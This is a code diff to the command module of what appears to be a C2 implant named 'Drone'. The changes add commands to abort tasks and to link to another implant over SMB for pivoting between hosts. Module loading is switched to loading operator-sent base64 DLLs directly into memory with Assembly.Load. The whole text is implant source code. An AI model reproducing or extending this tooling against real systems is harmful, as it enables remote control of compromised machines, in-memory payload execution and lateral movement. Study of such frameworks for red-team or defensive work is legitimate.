@@ -1,7 +1,8 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Reflection;
 using System.Threading;
-
+using Drone.Handlers;
 using Drone.Models;
 
 namespace Drone.Modules
@@ -21,6 +22,14 @@ namespace Drone.Modules
             {
                 new("/path/to/module.dll", false, true)
             }),
+            new("abort", "Abort a running task", AbortTask, new List<Command.Argument>
+            {
+                new("task-guid", false)
+            }),
+            new("link", "Link to an SMB Drone", LinkSmbDrone, new List<Command.Argument>
+            {
+               new("hostname", false) 
+            }),
             new("exit", "Exit this Drone", ExitDrone)
         };
 
@@ -35,10 +44,22 @@ namespace Drone.Modules
         private void LoadModule(DroneTask task, CancellationToken token)
         {
             var bytes = Convert.FromBase64String(task.Artefact);
-            var transact = new TransactedAssembly();
-            var asm = transact.Load(bytes);
+            var asm = Assembly.Load(bytes);
             
             Drone.LoadDroneModule(asm);
+        }
+
+        private void AbortTask(DroneTask task, CancellationToken token)
+        {
+            Drone.AbortTask(task.Arguments[0]);
+        }
+
+        private void LinkSmbDrone(DroneTask task, CancellationToken token)
+        {
+            var target = task.Arguments[0];
+            var handler = new DefaultSmbHandler(target);
+            
+            Drone.AddChildDrone(handler);
         }
 
         private void ExitDrone(DroneTask task, CancellationToken token)
